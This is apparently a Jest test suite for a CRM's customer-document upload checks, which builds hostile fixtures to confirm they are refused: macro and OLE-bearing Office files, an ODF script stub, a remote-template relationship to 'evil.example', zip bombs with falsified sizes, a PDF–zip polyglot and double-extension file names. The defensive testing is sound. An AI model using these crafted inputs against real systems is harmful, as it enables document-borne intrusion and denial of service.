/**
 * Customer documents beyond PDF (#1444, plan slice 7).
 *
 * Per format: a good file, a file whose content doesn't match its extension,
 * a declared type that doesn't fit, macros and embedded code, an external
 * relationship (remote-template injection), zip bombs, a polyglot and an
 * image — and a download's content type always comes from the registry.
 * Fixtures are built here with archiver; nothing is read from disk.
 */

process.env.JWT_SECRET = process.env.JWT_SECRET || 'crm-route-test-secret';

const request = require('supertest');
const jwt = require('jsonwebtoken');
const archiver = require('archiver');
const { randomUUID } = require('crypto');
const { PDFDocument } = require('pdf-lib');
const {
  bootCrmDb, seedMinimal, assignAdminRole, mintAdminToken, buildRouteApp,
} = require('./helpers/crmDb');

let db;
let cleanup;
let customerApp;
let adminApp;
let superTok;
let PDF;

const idOf = (inserted) => (typeof inserted[0] === 'object' ? inserted[0].id : inserted[0]);
const cookieFor = (customerId) => `customer_token=${jwt.sign(
  { type: 'customer', customerId, jti: randomUUID() }, process.env.JWT_SECRET, { issuer: 'picpeak-auth' },
)}`;
const binary = (res, cb) => {
  const chunks = [];
  res.on('data', (c) => chunks.push(c));
  res.on('end', () => cb(null, Buffer.concat(chunks)));
};

// The upload limit is 20 per customer per 10 minutes: a fresh customer per test.
let seq = 0;
async function newCustomer() {
  seq += 1;
  return idOf(await db('customer_accounts').insert({
    email: `formats-${seq}@example.com`, display_name: `F${seq}`, password_hash: 'x',
    preferred_language: 'en', is_active: 1, created_at: new Date().toISOString(),
  }).returning('id'));
}

function upload(customerId, buffer, filename, contentType) {
  return request(customerApp).post('/api/customer/documents').set('Cookie', cookieFor(customerId))
    .attach('file', buffer, { filename, contentType });
}

async function setAllowed(formats) {
  await db('app_settings').where({ setting_key: 'customer_documents_allowed_formats' })
    .update({ setting_value: JSON.stringify(formats) });
}

/** A zip from [name, content, { store }] entries, in order. */
function zip(entries) {
  return new Promise((resolve, reject) => {
    const archive = archiver('zip', { zlib: { level: 9 } });
    const chunks = [];
    archive.on('data', (c) => chunks.push(c));
    archive.on('end', () => resolve(Buffer.concat(chunks)));
    archive.on('error', reject);
    for (const [name, content, opts] of entries) archive.append(content, { name, ...(opts || {}) });
    archive.finalize();
  });
}

const CT = (main, extra = '') => `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
${main}${extra}</Types>`;
const DOCX_MAIN = '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>';
const DOCM_MAIN = '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>';
const XLSX_MAIN = '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>';
const ROOT_RELS = (target) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="${target}"/></Relationships>`;

const docx = (extra = []) => zip([
  ['[Content_Types].xml', CT(DOCX_MAIN)],
  ['_rels/.rels', ROOT_RELS('word/document.xml')],
  ['word/document.xml', '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>'],
  ...extra,
]);
const xlsx = () => zip([
  ['[Content_Types].xml', CT(XLSX_MAIN)],
  ['_rels/.rels', ROOT_RELS('xl/workbook.xml')],
  ['xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'],
]);
const odf = (mimetype, extra = []) => zip([
  ['mimetype', mimetype, { store: true }],
  ['content.xml', '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"/>'],
  ['META-INF/manifest.xml', '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"/>'],
  ...extra,
]);
const ODT = 'application/vnd.oasis.opendocument.text';
const ODS = 'application/vnd.oasis.opendocument.spreadsheet';
const DOCX_TYPE = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';

/** Rewrite every central-directory entry's declared uncompressed size. */
function lieAboutSizes(buf, size) {
  const out = Buffer.from(buf);
  for (let i = 0; i < out.length - 4; i += 1) {
    if (out.readUInt32LE(i) === 0x02014b50) out.writeUInt32LE(size, i + 24);
  }
  return out;
}

beforeAll(async () => {
  const doc = await PDFDocument.create();
  doc.addPage([200, 200]);
  PDF = Buffer.from(await doc.save());

  ({ db, cleanup } = await bootCrmDb());
  const { adminId } = await seedMinimal(db);
  await assignAdminRole(db, adminId, 'super_admin');
  superTok = mintAdminToken(adminId);
  await db('feature_flags').where({ key: 'documents' }).update({ value: 1 });
  require('../../src/middleware/requireFeatureFlag').invalidateFeatureFlagCache();
  customerApp = buildRouteApp('/api/customer', require('../../src/routes/customer'));
  adminApp = buildRouteApp('/api/admin/customers', require('../../src/routes/adminCustomers'));
}, 300000);

afterAll(async () => {
  if (cleanup) await cleanup();
});

describe('with the default setting (PDF only)', () => {
  it('accepts a PDF and refuses a well-formed docx, and says which formats it takes', async () => {
    const me = await newCustomer();
    expect((await upload(me, PDF, 'a.pdf', 'application/pdf')).status).toBe(201);
    const res = await upload(me, await docx(), 'a.docx', DOCX_TYPE);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('FORMAT_NOT_ALLOWED');
    const list = await request(customerApp).get('/api/customer/documents').set('Cookie', cookieFor(me));
    expect(list.body.allowedFormats).toEqual(['pdf']);
  });
});

describe('with every format allowed', () => {
  beforeAll(() => setAllowed(['pdf', 'docx', 'xlsx', 'odt', 'ods', 'txt', 'csv']));
  afterAll(() => setAllowed(['pdf']));

  it.each([
    ['docx', () => docx(), 'Vertrag.docx', DOCX_TYPE, DOCX_TYPE],
    ['xlsx', () => xlsx(), 'Kalkulation.xlsx', 'application/octet-stream', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'],
    ['odt', () => odf(ODT), 'Brief.odt', ODT, ODT],
    ['ods', () => odf(ODS), 'Tabelle.ods', '', ODS],
    ['txt', async () => Buffer.from('﻿Hallo Welt\nÄÖÜ\n'), 'notiz.txt', 'text/plain', 'text/plain; charset=utf-8'],
    ['csv', async () => Buffer.from('name,amount\n=HYPERLINK("x"),1\n'), 'liste.csv', 'application/vnd.ms-excel', 'text/csv; charset=utf-8'],
  ])('accepts a good %s, stores it verbatim and serves it with the registry type', async (format, make, name, declared, served) => {
    const me = await newCustomer();
    const bytes = await make();
    const res = await upload(me, bytes, name, declared);
    expect(res.status).toBe(201);
    const row = await db('customer_documents').where({ id: res.body.document.id }).first();
    expect(row.storage_key).toMatch(new RegExp(`\\.${format}$`));
    expect(row.original_name).toBe(name);
    await request(adminApp).post(`/api/admin/customers/${me}/documents/${row.id}/review`)
      .set('Authorization', `Bearer ${superTok}`).send({ status: 'clean' });
    const dl = await request(customerApp).get(`/api/customer/documents/${row.id}/download`)
      .set('Cookie', cookieFor(me)).buffer(true).parse(binary);
    expect(dl.status).toBe(200);
    expect(dl.headers['content-type']).toBe(served);
    expect(dl.headers['content-disposition']).toMatch(/^attachment;/);
    expect(dl.headers['x-content-type-options']).toBe('nosniff');
    // Verbatim: a CSV formula is the recipient's concern, not rewritten here.
    expect(Buffer.compare(dl.body, bytes)).toBe(0);
  });

  it('refuses content that does not match the extension', async () => {
    const me = await newCustomer();
    for (const [bytes, name] of [
      [await docx(), 'actually-docx.xlsx'],
      [await odf(ODS), 'actually-ods.odt'],
      [await xlsx(), 'actually-xlsx.odt'],
      [PDF, 'actually-pdf.docx'],
    ]) {
      const res = await upload(me, bytes, name, 'application/octet-stream');
      expect({ name, status: res.status, code: res.body.code }).toEqual({ name, status: 400, code: 'DOCUMENT_NOT_VALID' });
    }
  });

  it('refuses a declared type that does not fit the extension, and images', async () => {
    const me = await newCustomer();
    expect((await upload(me, await docx(), 'a.docx', 'application/pdf')).body.code).toBe('FORMAT_NOT_ALLOWED');
    expect((await upload(me, Buffer.from('x'), 'notes.txt', 'text/html')).body.code).toBe('FORMAT_NOT_ALLOWED');
    const jpg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
    expect((await upload(me, jpg, 'holiday.jpg', 'image/jpeg')).body.code).toBe('FORMAT_NOT_ALLOWED');
    expect((await upload(me, PDF, 'contract.pdf.exe', 'application/octet-stream')).body.code).toBe('FORMAT_NOT_ALLOWED');
    expect((await upload(me, Buffer.from('<p>x</p>'), 'x.docx.html', 'text/html')).body.code).toBe('FORMAT_NOT_ALLOWED');
  });

  it('refuses macros and embedded code', async () => {
    const me = await newCustomer();
    const macroRenamed = await zip([
      ['[Content_Types].xml', CT(DOCM_MAIN, '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>')],
      ['_rels/.rels', ROOT_RELS('word/document.xml')],
      ['word/document.xml', '<w:document/>'],
      ['word/vbaProject.bin', Buffer.alloc(64, 1)],
    ]);
    const embedded = await docx([['word/embeddings/oleObject1.bin', Buffer.alloc(32, 2)]]);
    const odfScripts = await odf(ODT, [['Scripts/python/evil.py', 'import os']]);
    const odfBasic = await odf(ODT, [['Basic/Standard/Module1.xml', '<script/>']]);
    for (const [bytes, name] of [
      [macroRenamed, 'invoice.docx'], [embedded, 'embedded.docx'], [odfScripts, 'a.odt'], [odfBasic, 'b.odt'],
    ]) {
      const res = await upload(me, bytes, name, 'application/octet-stream');
      expect({ name, code: res.body.code }).toEqual({ name, code: 'DOCUMENT_ACTIVE_CONTENT' });
    }
  });

  it('refuses a relationship to external content (remote template)', async () => {
    const me = await newCustomer();
    const remote = await docx([
      ['word/_rels/settings.xml.rels', `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`],
    ]);
    const res = await upload(me, remote, 'offer.docx', DOCX_TYPE);
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('refuses zip bombs inside the budget: declared sizes, and a part that inflates past its cap', async () => {
    const me = await newCustomer();
    const declared = lieAboutSizes(await docx(), 0x7fffffff);
    const res1 = await upload(me, declared, 'declared.docx', DOCX_TYPE);
    expect(res1.body.code).toBe('DOCUMENT_TOO_COMPLEX');

    // 8 MB of whitespace in the one part the check has to read: a few KB
    // compressed, over the 4 MB part budget once inflated.
    const padded = await zip([
      ['[Content_Types].xml', CT(DOCX_MAIN) + ' '.repeat(8 * 1024 * 1024)],
      ['_rels/.rels', ROOT_RELS('word/document.xml')],
      ['word/document.xml', '<w:document/>'],
    ]);
    expect(padded.length).toBeLessThan(200 * 1024);
    const started = Date.now();
    const res2 = await upload(me, padded, 'padded.docx', DOCX_TYPE);
    expect(res2.body.code).toBe('DOCUMENT_TOO_COMPLEX');
    expect(Date.now() - started).toBeLessThan(30000);
  });

  it('refuses a polyglot: a %PDF- prefix glued to a zip', async () => {
    const me = await newCustomer();
    const polyglot = Buffer.concat([Buffer.from('%PDF-1.7\n%âãÏÓ\n'), await docx()]);
    const asDocx = await upload(me, polyglot, 'poly.docx', DOCX_TYPE);
    expect(asDocx.body.code).toBe('DOCUMENT_NOT_VALID');
    const asPdf = await upload(me, polyglot, 'poly.pdf', 'application/pdf');
    expect(asPdf.status).toBe(400);
    expect(['NOT_A_PDF', 'PDF_TOO_COMPLEX', 'PDF_ACTIVE_CONTENT']).toContain(asPdf.body.code);
  });

  it('refuses text that is not UTF-8 or carries NUL bytes', async () => {
    const me = await newCustomer();
    expect((await upload(me, Buffer.from([0x48, 0x00, 0x49]), 'nul.txt', 'text/plain')).body.code).toBe('DOCUMENT_NOT_TEXT');
    expect((await upload(me, Buffer.from([0xc3, 0x28, 0x41]), 'latin.csv', 'text/csv')).body.code).toBe('DOCUMENT_NOT_TEXT');
  });

  it('accepts an admin upload the same way, and rebuilds the display name on the registry extension', async () => {
    const me = await newCustomer();
    const res = await request(adminApp).post(`/api/admin/customers/${me}/documents`)
      .set('Authorization', `Bearer ${superTok}`)
      .attach('file', await odf(ODS), { filename: 'Q3 Budget.v2.ODS', contentType: ODS });
    expect(res.status).toBe(201);
    const row = await db('customer_documents').where({ id: res.body.document.id }).first();
    expect(row.original_name).toBe('Q3 Budget.v2.ods');
    expect(row.mime_type).toBe(ODS);
    const list = await request(adminApp).get(`/api/admin/customers/${me}/documents`).set('Authorization', `Bearer ${superTok}`);
    expect(list.body.allowedFormats).toEqual(['pdf', 'docx', 'xlsx', 'odt', 'ods', 'txt', 'csv']);
  });

  it('ignores unknown entries in the setting', async () => {
    await setAllowed(['pdf', 'exe', 'docm', 'html']);
    try {
      expect(await require('../../src/services/documentFormats').getAllowedFormats()).toEqual(['pdf']);
    } finally {
      await setAllowed(['pdf', 'docx', 'xlsx', 'odt', 'ods', 'txt', 'csv']);
    }
  });
});

describe('erasure keeps the extension', () => {
  it('renames an erased docx to erased.docx', async () => {
    await setAllowed(['pdf', 'docx']);
    try {
      const me = await newCustomer();
      const res = await upload(me, await docx(), 'Pass_Anna.docx', DOCX_TYPE);
      expect(res.status).toBe(201);
      await require('../../src/services/customerAccountsService').eraseCustomer(me, null);
      const row = await db('customer_documents').where({ id: res.body.document.id }).first();
      expect(row.original_name).toBe('erased.docx');
    } finally {
      await setAllowed(['pdf']);
    }
  });
});
